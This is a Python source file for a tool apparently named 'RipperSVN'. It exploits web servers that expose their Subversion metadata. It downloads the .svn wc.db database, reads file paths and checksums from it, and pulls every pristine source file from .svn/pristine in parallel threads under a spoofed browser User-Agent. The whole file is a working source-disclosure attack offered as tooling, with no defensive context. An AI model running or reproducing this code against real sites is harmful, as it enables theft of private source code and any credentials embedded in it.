import sqlite3
from http import HTTP
import os
import concurrent.futures

class RipperSVN(object):
    def __init__(self, vulnerability):
        self.vulnerability = vulnerability
        self.host = vulnerability['host']
        self.session = HTTP()
        self.session.headers['User-Agent'] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        self.output_dir = "output/" + self.host.host + "/"

    def parse_wc(self):
        self.session.get_file("", self.output_dir + "wc.db", with_data=self.vulnerability['data'])
        print "Wrote wc.db to disk"

        conn = sqlite3.connect(self.output_dir + 'wc.db')
        c = conn.cursor()
        files = []

        for row in c.execute('select local_relpath, checksum from NODES'):
            try:
                path = ".svn/pristine/" + row[1][6:8] + "/" + row[1][6:] + ".svn-base"
                url = self.host.replace(path=path)
                filename = row[0]

                if not os.path.exists(self.output_dir + filename):
                    files.append((url, self.output_dir + filename))

            except:
                pass


        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            for file in files:
                executor.submit(self.session.get_file, file[0], file[1])